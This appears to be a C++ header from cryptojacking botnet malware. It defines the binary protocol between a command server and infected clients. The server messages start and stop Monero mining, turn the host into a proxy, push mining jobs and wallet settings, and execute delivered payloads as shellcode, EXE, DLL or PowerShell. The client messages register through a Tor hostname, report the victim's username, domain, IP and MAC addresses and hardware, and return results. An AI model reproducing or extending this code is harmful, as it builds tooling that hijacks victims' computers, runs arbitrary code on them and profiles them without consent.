#pragma once

#include "fields.h"

namespace net
{

namespace proto_const
{
	enum server_commands : uint8_t
	{
		server_hello = 0xff,
		server_conn_request = 0xfe,
		server_getinfo = 0xfd,
		server_start_mining = 0xfc,
		server_stop_mining = 0xfb,
		server_start_proxy = 0xfa,
		server_stop_proxy = 0xf9,
		server_mining_config = 0xf8,
		server_new_job = 0xf7,
		server_exec = 0xf6,
		server_goodbye = 0xf5,
	};
	
	enum client_commands : uint8_t
	{
		client_hello = 0x01,
		client_share = 0x02,
		client_info = 0x03,
		client_success = 0x04,
		client_error = 0x05,
		client_result = 0x06,
	};

	enum client_error_codes : uint8_t
	{
		operation_failed = 0x00,
	};

	enum pool_modes : uint8_t
	{
		direct_mode = 0x00,
		proxy_mode = 0x01,
		stratum_mode = 0x02,
	};

	enum exec_modes : uint8_t
	{
		shellcode = 0x00,
		exe = 0x01,
		dll = 0x02,
		powershell = 0x03
	};

	enum info_bit_offsets
	{
		tor_address = 0,
		computer_username,
		computer_name,
		computer_domain,
		os_version,
		cpu_name,
		gpu_name,
		memory_size,
		cpu_cores,
		cpu_threads,
		bandwidth,
		private_ip,
		public_ip,
		mac_address,
		max_hashrate,
		current_hashrate,
		current_power,
		current_mode,
		uptime,
		is_mining,
		is_proxy,
		proxy_address,
		proxy_client_count,
	};
}

template <typename tuple_type, typename func_type, size_t remaining = std::tuple_size<tuple_type>::value>
void tuple_for_each(tuple_type& tuple, func_type&& func)
{
	static const int idx = std::tuple_size<tuple_type>::value - remaining;
	static_assert(idx >= 0, "Negative index, remaining greater than tuple size");
	func(std::get<idx>(tuple));

	if constexpr (remaining > 1)
	{
		tuple_for_each<tuple_type, func_type, remaining - 1>(tuple, std::forward<func_type>(func));
	}
}

class field_length_accumulator
{
public:

	size_t length;

	field_length_accumulator()
	{
		length = 0;
	}

	template<typename field_type>
	void operator()(field_type& field)
	{
		length += field.length();
	}
};

template <typename write_iter>
class field_writer
{
public:

	field_writer(write_iter& iter, size_t& len)
		: m_iter(iter), m_len(len)
	{
	}

	template<typename field_type>
	void operator()(field_type& field)
	{
		field.write(m_iter, m_len);
		m_len -= field.length();
	}

private:
	write_iter& m_iter;
	size_t& m_len;
};

template <typename read_iter>
class field_reader
{
public:

	field_reader(read_iter& iter, size_t& len)
		: m_iter(iter), m_len(len)
	{
	}

	template<typename field_type>
	void operator()(field_type& field)
	{
		field.read(m_iter, m_len);
		m_len -= field.length();
	}

private:
	read_iter& m_iter;
	size_t& m_len;
};

class handler;

template <typename read_iter, typename write_iter>
class message
{
public:

	virtual void read(read_iter& iter, size_t len) = 0;
	virtual void write(write_iter& iter, size_t len) = 0;
	virtual size_t length() = 0;
	virtual void dispatch(handler& h) = 0;

};

template <typename read_iter, typename write_iter, typename derived_msg>
class message_base : message<read_iter, write_iter>
{
public:
	virtual void read(read_iter& iter, size_t len) override
	{
		tuple_for_each(static_cast<derived_msg*>(this)->m_fields, field_reader<read_iter>(iter, len));
	}

	virtual void write(write_iter& iter, size_t len) override
	{
		tuple_for_each(static_cast<derived_msg*>(this)->m_fields, field_writer<write_iter>(iter, len));
	}

	virtual size_t length() override
	{
		field_length_accumulator f;
		tuple_for_each(static_cast<derived_msg*>(this)->m_fields, f);
		return f.length;
	}

	virtual void dispatch(handler& h) override
	{
		//h.handle(static_cast<derived_msg&>(*this));
	}
};


//===============//
//SERVER MESSAGES//
//===============//


using proto_version_t = net::integer_field<uint8_t, false>;
using command_t = net::integer_field<uint8_t, false>;


template <typename read_iter, typename write_iter>
class server_hello : public message_base<read_iter, write_iter, server_hello<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, server_hello<read_iter, write_iter>>;

	using all_fields = std::tuple<proto_version_t, command_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	command_t& command = std::get<1>(m_fields);

private:
	all_fields m_fields;
};


template <typename read_iter, typename write_iter>
class server_conn_request : public message_base<read_iter, write_iter, server_conn_request<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, server_conn_request<read_iter, write_iter>>;

	using echo_t = net::buffer_field<false>;

	using all_fields = std::tuple<proto_version_t, command_t, echo_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	command_t& command = std::get<1>(m_fields);
	echo_t& echo = std::get<2>(m_fields);

	server_conn_request()
	{
		echo.set_length(16);
	}

private:
	all_fields m_fields;
};


template <typename read_iter, typename write_iter>
class server_getinfo : public message_base<read_iter, write_iter, server_getinfo<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, server_getinfo<read_iter, write_iter>>;

	using info_bitmask_t = net::integer_field<uint32_t>;

	using all_fields = std::tuple<proto_version_t, command_t, info_bitmask_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	command_t& command = std::get<1>(m_fields);
	info_bitmask_t& info_bitmask = std::get<2>(m_fields);

private:
	all_fields m_fields;
};


template <typename read_iter, typename write_iter>
class server_start_mining : public message_base<read_iter, write_iter, server_start_mining<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, server_start_mining<read_iter, write_iter>>;

	using all_fields = std::tuple<proto_version_t, command_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	command_t& command = std::get<1>(m_fields);

private:
	all_fields m_fields;
};


template <typename read_iter, typename write_iter>
class server_stop_mining : public message_base<read_iter, write_iter, server_stop_mining<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, server_stop_mining<read_iter, write_iter>>;

	using all_fields = std::tuple<proto_version_t, command_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	command_t& command = std::get<1>(m_fields);

private:
	all_fields m_fields;
};


template <typename read_iter, typename write_iter>
class server_start_proxy : public message_base<read_iter, write_iter, server_start_proxy<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, server_start_proxy<read_iter, write_iter>>;

	using all_fields = std::tuple<proto_version_t, command_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	command_t& command = std::get<1>(m_fields);

private:
	all_fields m_fields;
};


template <typename read_iter, typename write_iter>
class server_stop_proxy : public message_base<read_iter, write_iter, server_stop_proxy<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, server_stop_proxy<read_iter, write_iter>>;

	using all_fields = std::tuple<proto_version_t, command_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	command_t& command = std::get<1>(m_fields);

private:
	all_fields m_fields;
};


template <typename read_iter, typename write_iter>
class server_mining_config : public message_base<read_iter, write_iter, server_mining_config<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, server_mining_config<read_iter, write_iter>>;

	using pool_mode_t = net::integer_field<uint8_t, false>;
	using pool_address_t = net::string_field<true, uint8_t>;
	using monero_wallet_t = net::string_field<false>;

	using all_fields = std::tuple<proto_version_t, command_t, pool_mode_t, pool_address_t, monero_wallet_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	command_t& command = std::get<1>(m_fields);
	pool_mode_t& pool_mode = std::get<2>(m_fields);
	pool_address_t& pool_address = std::get<3>(m_fields);
	monero_wallet_t& monero_wallet = std::get<4>(m_fields);

	server_mining_config()
	{
		monero_wallet.set_length(95);
	}

	virtual void read(read_iter& iter, size_t len) override
	{
		field_reader<read_iter> reader(iter, len);
		reader(proto_version);
		reader(command);
		reader(pool_mode);
		reader(pool_address);
		if (pool_mode.value() == net::proto_const::pool_modes::stratum_mode)
			reader(monero_wallet);
	}

private:
	all_fields m_fields;
};


template <typename read_iter, typename write_iter>
class server_new_job : public message_base<read_iter, write_iter, server_new_job<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, server_new_job<read_iter, write_iter>>;

	using job_id_t = net::integer_field<uint32_t, true>;
	using blob_t = net::buffer_field<true, uint16_t>;
	using target_t = net::integer_field<uint64_t, false>;
	using nonce_offset_t = net::integer_field<uint16_t, true>;
	using nonce_mask_t = net::integer_field<uint32_t, true>;
	using seed_hash_t = net::buffer_field<false>;

	using all_fields = std::tuple<proto_version_t, command_t, job_id_t, blob_t, target_t, nonce_offset_t, nonce_mask_t, seed_hash_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	command_t& command = std::get<1>(m_fields);
	job_id_t& job_id = std::get<2>(m_fields);
	blob_t& blob = std::get<3>(m_fields);
	target_t& target = std::get<4>(m_fields);
	nonce_offset_t& nonce_offset = std::get<5>(m_fields);
	nonce_mask_t& nonce_mask = std::get<6>(m_fields);
	seed_hash_t& seed_hash = std::get<7>(m_fields);

	server_new_job()
	{
		seed_hash.set_length(32);
	}

private:
	all_fields m_fields;
};


template <typename read_iter, typename write_iter>
class server_exec : public message_base<read_iter, write_iter, server_exec<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, server_exec<read_iter, write_iter>>;

	using exec_mode_t = net::integer_field<uint8_t, false>;
	using data_t = net::buffer_field<true, uint32_t>;

	using all_fields = std::tuple<proto_version_t, command_t, exec_mode_t, data_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	command_t& command = std::get<1>(m_fields);
	exec_mode_t& exec_mode = std::get<2>(m_fields);
	data_t& data = std::get<3>(m_fields);

private:
	all_fields m_fields;
};


template <typename read_iter, typename write_iter>
class server_goodbye : public message_base<read_iter, write_iter, server_goodbye<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, server_goodbye<read_iter, write_iter>>;

	using all_fields = std::tuple<proto_version_t, command_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	command_t& command = std::get<1>(m_fields);

private:
	all_fields m_fields;
};


//===============//
//CLIENT MESSAGES//
//===============//


using agent_version_t = net::integer_field<uint8_t, false>;


template <typename read_iter, typename write_iter>
class client_hello : public message_base<read_iter, write_iter, client_hello<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, client_hello<read_iter, write_iter>>;

	using tor_hostname_t = net::string_field<false>;
	using code_t = net::buffer_field<false>;

	using all_fields = std::tuple<proto_version_t, agent_version_t, command_t, tor_hostname_t, code_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	agent_version_t& agent_version = std::get<1>(m_fields);
	command_t& command = std::get<2>(m_fields);
	tor_hostname_t& tor_hostname = std::get<3>(m_fields);
	code_t& code = std::get<4>(m_fields);

	client_hello()
	{
		tor_hostname.set_length(56);
		code.set_length(16);
	}

private:
	all_fields m_fields;
};


template <typename read_iter, typename write_iter>
class client_share : public message_base<read_iter, write_iter, client_share<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, client_share<read_iter, write_iter>>;

	using job_id_t = net::integer_field<uint32_t, true>;
	using nonce_t = net::integer_field<uint32_t, true>;
	using hash_t = net::buffer_field<false>;

	using all_fields = std::tuple<proto_version_t, agent_version_t, command_t, job_id_t, nonce_t, hash_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	agent_version_t& agent_version = std::get<1>(m_fields);
	command_t& command = std::get<2>(m_fields);
	job_id_t& job_id = std::get<3>(m_fields);
	nonce_t& nonce = std::get<4>(m_fields);
	hash_t& hash = std::get<5>(m_fields);

	client_share()
	{
		hash.set_length(32);
	}

private:
	all_fields m_fields;
};


template <typename read_iter, typename write_iter>
class client_info : public message_base<read_iter, write_iter, client_info<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, client_info<read_iter, write_iter>>;

	using info_bitmask_t = net::integer_field<uint32_t, true>;
	using info_t = net::string_field<true, uint32_t>;

	using all_fields = std::tuple<proto_version_t, agent_version_t, command_t, info_bitmask_t, info_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	agent_version_t& agent_version = std::get<1>(m_fields);
	command_t& command = std::get<2>(m_fields);
	info_bitmask_t& info_bitmask = std::get<3>(m_fields);
	info_t& info = std::get<4>(m_fields);

private:
	all_fields m_fields;
};


template <typename read_iter, typename write_iter>
class client_success : public message_base<read_iter, write_iter, client_success<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, client_success<read_iter, write_iter>>;

	using all_fields = std::tuple<proto_version_t, agent_version_t, command_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	agent_version_t& agent_version = std::get<1>(m_fields);
	command_t& command = std::get<2>(m_fields);

private:
	all_fields m_fields;
};


template <typename read_iter, typename write_iter>
class client_error : public message_base<read_iter, write_iter, client_error<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, client_error<read_iter, write_iter>>;

	using error_code_t = net::integer_field<uint8_t, false>;

	using all_fields = std::tuple<proto_version_t, agent_version_t, command_t, error_code_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	agent_version_t& agent_version = std::get<1>(m_fields);
	command_t& command = std::get<2>(m_fields);
	error_code_t& error_code = std::get<3>(m_fields);

private:
	all_fields m_fields;
};


template <typename read_iter, typename write_iter>
class client_result : public message_base<read_iter, write_iter, client_result<read_iter, write_iter>>
{
public:
	friend message_base<read_iter, write_iter, client_result<read_iter, write_iter>>;

	using data_t = net::buffer_field<true, uint32_t>;

	using all_fields = std::tuple<proto_version_t, agent_version_t, command_t, data_t>;

	proto_version_t& proto_version = std::get<0>(m_fields);
	agent_version_t& agent_version = std::get<1>(m_fields);
	command_t& command = std::get<2>(m_fields);
	data_t& data = std::get<3>(m_fields);

private:
	all_fields m_fields;
};


}